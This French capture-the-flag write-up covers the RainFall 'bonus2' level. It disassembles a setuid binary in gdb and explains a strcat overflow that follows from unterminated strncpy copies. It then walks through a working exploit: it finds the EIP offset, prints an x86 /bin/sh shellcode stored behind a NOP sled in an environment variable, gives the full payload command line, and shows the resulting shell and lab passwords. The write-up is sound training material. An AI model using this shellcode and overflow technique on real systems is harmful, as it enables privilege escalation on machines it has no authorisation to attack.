## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le bonus1
  $ ssh bonus2@127.0.0.1 -p 4242
     _____       _       ______    _ _
    |  __ \     (_)     |  ____|  | | |
    | |__) |__ _ _ _ __ | |__ __ _| | |
    |  _  /  _` | | '_ \|  __/ _` | | |
    | | \ \ (_| | | | | | | | (_| | | |
    |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                  Good luck & Have fun

    To start, ssh with level0/level0 on 10.0.2.15:4242
  bonus2@127.0.0.1's password 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
  [...]
  bonus2@RainFall:~$
  
  # On regarde ce qu'on a
  bonus1@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 bonus2 bonus2   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 bonus2 bonus2  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 bonus2 bonus2 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 bonus3 users  5664 Mar  6  2016 bonus2
    -rw-r--r--+ 1 bonus2 bonus2   65 Sep 23  2015 .pass
    -rw-r--r--  1 bonus2 bonus2  675 Apr  3  2012 .profile

  # On teste les arguments
  bonus2@RainFall:~$ ./bonus2
  bonus2@RainFall:~$ ./bonus2 test
  bonus2@RainFall:~$ ./bonus2 test test
    Hello test
  bonus2@RainFall:~$ ./bonus2 SUUUUUUUUUUUUUUUUUUUUUUUPPPPPPPPPPPPPPPPEEEEEEEEEERRRRRRRRRLLLLLLLLOOOOOOOOOONNNNNNNNNNGGGGGGGGGGGG SUUUUUUUUUUUUUUUUUUUUUUUPPPPPPPPPPPPPPPPEEEEEEEEEERRRRRRRRRLLLLLLLLOOOOOOOOOONNNNNNNNNNGGGGGGGGGGG
    Hello SUUUUUUUUUUUUUUUUUUUUUUUPPPPPPPPPPPPPPPPSUUUUUUUUUUUUUUUUUUUUUUUPPPPPPPP
  Segmentation fault (core dumped)
  ```
  * Pas de résultat tant qu'on a - de 2 arguments
  * Print "Hello argv[2]" avec 2 arguments
  * Segfault quand on met un 2eme argument trop long (encore une copie hasardeuse)


### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    bonus2@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    bonus2@RainFall:/tmp$ gdb ~/bonus2
      [...]
      Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info functions
    All defined functions:

    Non-debugging symbols:
    0x08048318  _init
    0x08048360  memcmp
    0x08048360  memcmp@plt
    0x08048370  strcat
    0x08048370  strcat@plt
    0x08048380  getenv
    0x08048380  getenv@plt
    0x08048390  puts
    0x08048390  puts@plt
    0x080483a0  __gmon_start__
    0x080483a0  __gmon_start__@plt
    0x080483b0  __libc_start_main
    0x080483b0  __libc_start_main@plt
    0x080483c0  strncpy
    0x080483c0  strncpy@plt
    0x080483d0  _start
    0x08048400  __do_global_dtors_aux
    0x08048460  frame_dummy # Func habituelle
    0x08048484  greetuser   # Nouvelle fonction greetuser
    0x08048529  main        # Func habituelle
    0x08048640  __libc_csu_init
    0x080486b0  __libc_csu_fini
    0x080486b2  __i686.get_pc_thunk.bx
    0x080486c0  __do_global_ctors_aux
    0x080486ec  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x8048738
      0x8048738:	 "LANG"

    gdb-peda$ x/s 0x804873d
      0x804873d:	 "fi"

    gdb-peda$ x/s 0x8049988
      0x8049988 <language>:	 ""
    
    gdb-peda$ x/s 0x8048710
      0x8048710:	 "Hello "

    gdb-peda$ x/s 0x8048717
      0x8048717:	 "Hyvää päivää "

    gdb-peda$ x/s 0x804872a
      0x804872a:	 "Goedemiddag! "
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
      Dump of assembler code for function main:
      # Initialisation, sauvegarde de edi, esi, ebx (on va faire des boucles)
      0x08048529 <+0>:	push   ebp
      0x0804852a <+1>:	mov    ebp,esp
      0x0804852c <+3>:	push   edi  # EBP - 4
      0x0804852d <+4>:	push   esi  # EBP - 8
      0x0804852e <+5>:	push   ebx  # EBP - 12

      # Alignement de la mémoire et allocation de 160
      0x0804852f <+6>:	and    esp,0xfffffff0
      0x08048532 <+9>:	sub    esp,0xa0

      # Si argc != 3 return 1
      0x08048538 <+15>:	cmp    DWORD PTR [ebp+0x8],0x3
      0x0804853c <+19>:	je     0x8048548 <main+31>
      0x0804853e <+21>:	mov    eax,0x1
      0x08048543 <+26>:	jmp    0x8048630 <main+263>

      # Memset(buffer[68], 0, 76)
      # Le 68 sort de 160 - 80 - 3 * 8 (les 3 registres push à l'initialisation) 
      # Le 76 sort de 0x13 * 4 puisque rep stos fait avancer de 4 par itération
      # On voit qu'on va potentiellement réécrire sur ebx et esi (c'est peut etre voulu)
      # On fait globalement un bzero sur buffer
      0x08048548 <+31>:	lea    ebx,[esp+0x50]
      0x0804854c <+35>:	mov    eax,0x0
      0x08048551 <+40>:	mov    edx,0x13
      0x08048556 <+45>:	mov    edi,ebx
      0x08048558 <+47>:	mov    ecx,edx
      0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax

      # Call strncpy(buffer1[40], argv[1], 40)
      # On copie 40 chars du premier argument sur notre premier buffer. Pas de \0 si len(argv[1]) >= 40
      0x0804855c <+51>:	mov    eax,DWORD PTR [ebp+0xc]
      0x0804855f <+54>:	add    eax,0x4
      0x08048562 <+57>:	mov    eax,DWORD PTR [eax]
      0x08048564 <+59>:	mov    DWORD PTR [esp+0x8],0x28
      0x0804856c <+67>:	mov    DWORD PTR [esp+0x4],eax
      0x08048570 <+71>:	lea    eax,[esp+0x50]
      0x08048574 <+75>:	mov    DWORD PTR [esp],eax
      0x08048577 <+78>:	call   0x80483c0 <strncpy@plt>

      # Call strncpy(buffer2[32], argv[2], 32)
      # On copie 32 chars de argv[2] dans notre 2eme buffer
      0x0804857c <+83>:	mov    eax,DWORD PTR [ebp+0xc]
      0x0804857f <+86>:	add    eax,0x8
      0x08048582 <+89>:	mov    eax,DWORD PTR [eax]
      0x08048584 <+91>:	mov    DWORD PTR [esp+0x8],0x20
      0x0804858c <+99>:	mov    DWORD PTR [esp+0x4],eax
      0x08048590 <+103>:	lea    eax,[esp+0x50]
      0x08048594 <+107>:	add    eax,0x28
      0x08048597 <+110>:	mov    DWORD PTR [esp],eax
      0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>

      # ESP+0x9c = lang_env = getenv("LANG")
      0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738
      0x080485a6 <+125>:	call   0x8048380 <getenv@plt>
      0x080485ab <+130>:	mov    DWORD PTR [esp+0x9c],eax

      # If !lang_env Jump to main+239
      0x080485b2 <+137>:	cmp    DWORD PTR [esp+0x9c],0x0
      0x080485ba <+145>:	je     0x8048618 <main+239>

      # Call memcmp(lang_env, "fi", 2)
      0x080485bc <+147>:	mov    DWORD PTR [esp+0x8],0x2
      0x080485c4 <+155>:	mov    DWORD PTR [esp+0x4],0x804873d
      0x080485cc <+163>:	mov    eax,DWORD PTR [esp+0x9c]
      0x080485d3 <+170>:	mov    DWORD PTR [esp],eax
      0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>

      # Si lang_env == "fi" globale language = 1 et jump main+239
      0x080485db <+178>:	test   eax,eax
      0x080485dd <+180>:	jne    0x80485eb <main+194>
      0x080485df <+182>:	mov    DWORD PTR ds:0x8049988,0x1
      0x080485e9 <+192>:	jmp    0x8048618 <main+239>

      # Ici lang_env != "fi"
      # Call memcmp(lang_env, "nl", 2)
      0x080485eb <+194>:	mov    DWORD PTR [esp+0x8],0x2
      0x080485f3 <+202>:	mov    DWORD PTR [esp+0x4],0x8048740
      0x080485fb <+210>:	mov    eax,DWORD PTR [esp+0x9c]
      0x08048602 <+217>:	mov    DWORD PTR [esp],eax
      0x08048605 <+220>:	call   0x8048360 <memcmp@plt>

      # If lang_env == "nl" globale language = 2
      0x0804860a <+225>:	test   eax,eax
      0x0804860c <+227>:	jne    0x8048618 <main+239>
      0x0804860e <+229>:	mov    DWORD PTR ds:0x8049988,0x2

      # Ici, on peut avoir dans language : 0, 1(si LANG="fi") ou 2(si LANG="nl")
      # Call greetuser(memcpy(esp, buffer1, 76))
      # A la place de buffer1 on peut mettre buffer1+buffer2 car on a strcpy nos argv et que s'ils sont trop longs il n'y a pas de \0 entre les 2.
      0x08048618 <+239>:	mov    edx,esp
      0x0804861a <+241>:	lea    ebx,[esp+0x50]
      0x0804861e <+245>:	mov    eax,0x13
      0x08048623 <+250>:	mov    edi,edx
      0x08048625 <+252>:	mov    esi,ebx
      0x08048627 <+254>:	mov    ecx,eax
      0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
      0x0804862b <+258>:	call   0x8048484 <greetuser>

      # Return
      0x08048630 <+263>:	lea    esp,[ebp-0xc]
      0x08048633 <+266>:	pop    ebx
      0x08048634 <+267>:	pop    esi
      0x08048635 <+268>:	pop    edi
      0x08048636 <+269>:	pop    ebp
      0x08048637 <+270>:	ret
      End of assembler dump.
  ```
  * Regardons greetuser

  ```shell
  gdb-peda$ pdisas greetuser
    Dump of assembler code for function greetuser:
    # Initialisation, allocation de 88 octets
    0x08048484 <+0>:	push   ebp
    0x08048485 <+1>:	mov    ebp,esp
    0x08048487 <+3>:	sub    esp,0x58

    # Si la globale language == 1 ("fi"), Jump to greetuser+54
    0x0804848a <+6>:	mov    eax,ds:0x8049988
    0x0804848f <+11>:	cmp    eax,0x1
    0x08048492 <+14>:	je     0x80484ba <greetuser+54>

    # Si la globale language == 2 ("nl"), Jump to greetuser+101
    0x08048494 <+16>:	cmp    eax,0x2
    0x08048497 <+19>:	je     0x80484e9 <greetuser+101>

    # Si globale language != 0, Jump to greetuser+134
    0x08048499 <+21>:	test   eax,eax
    0x0804849b <+23>:	jne    0x804850a <greetuser+134>

    # Ici language == 0 (env.LANG not in ["fi", "nl"])
    # Call strcpy(buffer[72], "Hello ") et jump a greetuser+134
    0x0804849d <+25>:	mov    edx,0x8048710
    0x080484a2 <+30>:	lea    eax,[ebp-0x48]
    0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx]
    0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx
    0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+0x4]
    0x080484ad <+41>:	mov    WORD PTR [eax+0x4],cx
    0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+0x6]
    0x080484b5 <+49>:	mov    BYTE PTR [eax+0x6],dl
    0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>

    # Ici global language == 1
    # Call strcpy(buffer[72], "Hyvää päivää ") (c'est du finlandais) et jump a greetuser+134
    # Tous ces strcpy gèrent l'unicode
    0x080484ba <+54>:	mov    edx,0x8048717
    0x080484bf <+59>:	lea    eax,[ebp-0x48]
    0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
    0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
    0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+0x4]
    0x080484c9 <+69>:	mov    DWORD PTR [eax+0x4],ecx
    0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+0x8]
    0x080484cf <+75>:	mov    DWORD PTR [eax+0x8],ecx
    0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+0xc]
    0x080484d5 <+81>:	mov    DWORD PTR [eax+0xc],ecx
    0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+0x10]
    0x080484dc <+88>:	mov    WORD PTR [eax+0x10],cx
    0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+0x12]
    0x080484e4 <+96>:	mov    BYTE PTR [eax+0x12],dl
    0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>

    # Ici global language == 2
    # Call strcpy(buffer[72], "Goedemiddag! ") (c'est du néerlandais) et glisse jusqu'a greetuser+134
    0x080484e9 <+101>:	mov    edx,0x804872a
    0x080484ee <+106>:	lea    eax,[ebp-0x48]
    0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx]
    0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx
    0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+0x4]
    0x080484f8 <+116>:	mov    DWORD PTR [eax+0x4],ecx
    0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+0x8]
    0x080484fe <+122>:	mov    DWORD PTR [eax+0x8],ecx
    0x08048501 <+125>:	movzx  edx,WORD PTR [edx+0xc]
    0x08048505 <+129>:	mov    WORD PTR [eax+0xc],dx
    0x08048509 <+133>:	nop

    # Apres avoir copié Bonjour en anglais, neerlandais ou finlandais dans notre buffer, on arrive là.
    # Call strcat(buffer[72], copie_argv1)
    # copie_argv1 l'argument envoyé par le main. On pourrait aussi l'appeler copie_argv1_argv2 (cf. main+207)
    # copie_argv1_argv2 peut avoir une taille maximum de 72 (40 + 32, cf. main).
    # Donc on a potentiellement un overflow ici car si on est en finlandais len(buffer) + 72 = 17 + 72 = 99, ce qui est bien plus grand que notre buffer.
    0x0804850a <+134>:	lea    eax,[ebp+0x8]
    0x0804850d <+137>:	mov    DWORD PTR [esp+0x4],eax
    0x08048511 <+141>:	lea    eax,[ebp-0x48]
    0x08048514 <+144>:	mov    DWORD PTR [esp],eax
    0x08048517 <+147>:	call   0x8048370 <strcat@plt>

    # Call puts(buffer)
    0x0804851c <+152>:	lea    eax,[ebp-0x48]
    0x0804851f <+155>:	mov    DWORD PTR [esp],eax
    0x08048522 <+158>:	call   0x8048390 <puts@plt>

    # Return
    0x08048527 <+163>:	leave
    0x08048528 <+164>:	ret
    End of assembler dump.
  ```

## 2: Comportement
  * Notre programme prend donc 2 paramètres et print Bonjour dans la langue de l'env suivi des 2 parametres séparés par un espace.
  * Il y a des strcpy non protégés qui peuvent nous permettre d'overflow dans greetuser.

## 3: Exploit

### A: Explication

> L'explication est déjà presque faite dans l'analyse de l'asm mais on va la reprendre.\
> Dans le main on strncpy nos 2 arguments dans 2 buffers qui se suivent.\
> Or strncpy ne met pas de \0 si les arguments sont trop longs.\
> Donc lorsqu'on envoie le buffer où l'on a copié argv[1], on a potentiellement argv[2] a la fin avant un \0, ce qui nous fait un potentiel buffer de 72.\
> greetuser concatène un bonjour dans la langue de notre env et ce buffer, le tout dans un petit buffer de 72.\
> On va donc pouvoir réécrire sur l'EIP du greetuser avec la langue a "fi" ou "nl", car "Hello " n'est pas assez long.


### B: Creation de l'exploit

* Il nous faut donc:
  - Trouver l'offset à partir duquel on réécrit sur l'EIP dans le 2ème argument
  - Un shellcode paddé d'une NOPSLED à mettre dans notre env
  - L'addresse de notre SHELL_CODE

```shell
  # On aurait pu mettre "nl"
  bonus2@RainFall:/tmp$ export LANG="fi"

  gdb-peda$ pattern create 200 patternb2
    Writing pattern of 200 chars to filename "patternb2"

  gdb-peda$ run $(cat patternb2) $(cat patternb2)
    Hyvää päivää AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAAA%AAsAABAA$AAnAACAA-AA(AADAA;A

    Program received signal SIGSEGV, Segmentation fault.
    [----------------------------------registers-----------------------------------]
    # BOUM L'EIP
    [...]
    EIP: 0x2d414143 ('CAA-')
    [...]
    [-------------------------------------code-------------------------------------]
    # Evidemment on a réécrit l'EIP on crash sur le return
    Invalid $PC address: 0x2d414143
    [...]
    Stopped reason: SIGSEGV
    0x2d414143 in ?? ()

  gdb-peda$ pattern search
    # On a notre offset. Avec "nl", il serait de 23
    EIP+0 found at offset: 18
    [...]

  gdb-peda$ shellcode generate x86/linux exec
    # Et voila un shellcode de 24 bytes
    shellcode = (
        "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
        "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
    )

  bonus2@RainFall:/tmp$ export SHELL_CODE=$(python -c 'print "\x90" * 100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"')


  gdb-peda$ b * main
  gdb-peda$ run test test
  gdb-peda$ x/30s *((char**)environ)
    [...]
    0xbffffeca:	 "SHELL_CODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343\061\311\211\312j\vX\315\200"
    [...]
```

* env address = 0xbffffeca + 50 = 0xbffffefc = \xfc\xfe\xff\xbf
* Premier argument: $(python -c 'print "\x90" * 100')
* Deuxieme argument: $(python -c 'print "\x90" * 18 + "\xfc\xfe\xff\xbf"')
* On lance donc notre exploit

```shell
  bonus2@RainFall:/tmp$ ~/bonus2 $(python -c 'print "\x90" * 100') $(python -c 'print "\x90" * 18 + "\xfc\xfe\xff\xbf"')
    Hyvää päivää ��������������������������������������������������������������
  $ whoami
    bonus3
  $ cat /home/user/bonus3/.pass
    71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
  bonus2@RainFall:/tmp$ su bonus3
    Password:
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/bonus3/bonus3
  bonus3@RainFall:~$
```